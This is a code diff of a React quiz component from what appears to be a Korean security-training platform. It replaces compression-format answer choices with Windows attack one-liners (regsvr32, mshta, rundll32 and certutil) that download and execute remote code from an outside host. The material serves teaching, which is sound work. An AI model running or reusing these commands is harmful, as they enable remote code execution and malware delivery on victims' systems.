@@ -238,9 +238,9 @@ class ClassWindowMultipleSingle extends Component {
                         }
                     </Box>
                     <Box className={classes.marginBottom}>
-                        <Typography style={{fontWeight:900}}>[퀴즈]</Typography>
+                        <Typography style={{fontWeight:600}}>[퀴즈]</Typography>
                         <Typography className={typeButton2 ? clsx(classes.textStyle, classes.textStyle2, classes.bold) : clsx(classes.textStyle, classes.bold)}>
-                            “소프트웨어_개발_계약서.hwp” 문서에서 악성 행위를 수행하는 데이터 스트림이 사용하고 있는 압축 방식을 식별하세요.
+                            “malicious-8bc.docx” 문서를 삽입된 공격 코드를 식별하세요.
                         </Typography>
                     </Box>
 
@@ -263,7 +263,7 @@ class ClassWindowMultipleSingle extends Component {
                                             disableRipple
                                         />
                                     }
-                                    label="가. zlib"
+                                    label="가. cmd.exe /c regsvr32.exe /s /n /u /i:http://www.waver.com/bmda4kl4 scrobj.dll"
                                 />
 
                                 {students &&
@@ -280,7 +280,7 @@ class ClassWindowMultipleSingle extends Component {
                                             disableRipple
                                         />
                                     }
-                                    label="나. snappy"
+                                    label="나. mshta.exe javascript:a=(GetObject(&#34;script:http://www.waver.com/m.sct&#34;)).Exec();close();"
                                 />
                             </Box>
                             <Box className={classes.checkBox2}>
@@ -293,7 +293,7 @@ class ClassWindowMultipleSingle extends Component {
                                             disableRipple
                                         />
                                     }
-                                    label="다. lz4"
+                                    label="다. rundll32.exe PowerShdll.dll,main"
                                 />
                             </Box>
 
@@ -308,7 +308,7 @@ class ClassWindowMultipleSingle extends Component {
                                             disableRipple
                                         />
                                     }
-                                    label="라. gzip"
+                                    label="라. certutil.exe -urlcache -f http://http://www.waver.com/bmda4kl4/40564.exe bad.exe"
                                 />
                                 {students &&
                                     <PasswordNumberCheckedErrorIcon/>
